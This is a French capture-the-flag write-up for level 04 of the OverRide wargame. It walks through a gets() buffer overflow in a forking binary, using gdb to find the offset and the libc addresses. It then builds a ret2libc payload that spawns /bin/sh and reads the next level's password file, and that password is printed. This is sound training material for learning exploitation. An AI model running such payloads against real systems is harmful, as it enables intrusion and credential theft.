# Level 04

```
level04@OverRide:~$ ./level04
Give me some shellcode, k
asd
child is exiting...
```
Le programme decompiler nous montre un fork, et dans le child un gets, precede par "Give me some shellcode, k".

L'exploit se fait donc par le gets, qui n'a pas de protection de taille maximum. Dans le processus parent, le programme affiche "child is exiting..." lorsque le child termine.

Afin de trouver l'adresse a ecraser nous allons utiliser gdb, mais avec le suivi du programme enfant pour avoir acces a cette partie du programme.

```
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
(gdb) set follow-fork-mode child <--- suivi du programme fils
(gdb) run
Starting program: /home/users/level04/level04
[New process 1998]
Give me some shellcode, k
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1998]
0x6e6e6e6e in ?? ()
```

L'offset est 156.

La solution trouvee est de faire un shellcode comme suit :

[A*156] + [Adresse de system] + [A*4] + [Adresse de "/bin/sh"]

[A*156] : Ce sont les données de remplissage pour atteindre la partie de la pile où l'adresse de retour est stockée.

[Adresse de system] : L'adresse de retour est écrasée par l'adresse de la fonction system, ce qui redirige l'exécution du programme vers cette fonction.

[A*4] : Offset pour passer l'adresse de retour de system.

[Adresse de "/bin/sh"] : Ceci est l'argument pour la fonction system, qui doit être placé juste après l'adresse de retour de system pour être correctement référencé en tant qu'argument de cette fonction.


Pour trouver les adresse de system et /bin/sh nous pouvons aller dans gdb

```
(gdb) b * 0x080486d0
Breakpoint 1 at 0x80486d0
(gdb) run
Starting program: /home/users/level04/level04

Breakpoint 1, 0x080486d0 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find 0xf7e6aed0, 0xffffffff, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```

```
level04@OverRide:~$ python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "AAAA" + "\xec\x97\xf8\xf7"' > /tmp/payload4
level04@OverRide:~$ cat /tmp/payload4 - | /home/users/level04/level04
Give me some shellcode, k
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```